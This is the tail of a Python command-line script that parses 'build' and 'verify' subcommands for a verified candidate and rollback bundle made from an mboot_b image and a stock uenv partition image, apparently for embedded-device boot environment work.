def parse_arguments(arguments: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    subparsers = parser.add_subparsers(dest="action", required=True)
    build = subparsers.add_parser("build", help="build a verified candidate and rollback bundle")
    build.add_argument("mboot", type=Path, help="exact active mboot_b image")
    build.add_argument("stock", type=Path, help="exact stock uenv partition image")
    build.add_argument("output", type=Path, help="new output directory")
    verify = subparsers.add_parser("verify", help="verify an existing bundle")
    verify.add_argument("mboot", type=Path, help="exact active mboot_b image")
    verify.add_argument("bundle", type=Path, help="bundle directory")
    verify.add_argument(
        "--stock", type=Path, help="stock image path when the manifest path moved"
    )
    return parser.parse_args(arguments)


def main(arguments: list[str]) -> int:
    options = parse_arguments(arguments)
    try:
        if options.action == "build":
            manifest = build_bundle(
                options.mboot.resolve(), options.stock.resolve(), options.output.resolve()
            )
            print_manifest_summary(manifest, options.output.resolve())
        else:
            stock = options.stock.resolve() if options.stock else None
            manifest = verify_bundle(
                options.mboot.resolve(), options.bundle.resolve(), stock_override=stock
            )
            print_manifest_summary(manifest, options.bundle.resolve())
    except BundleError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
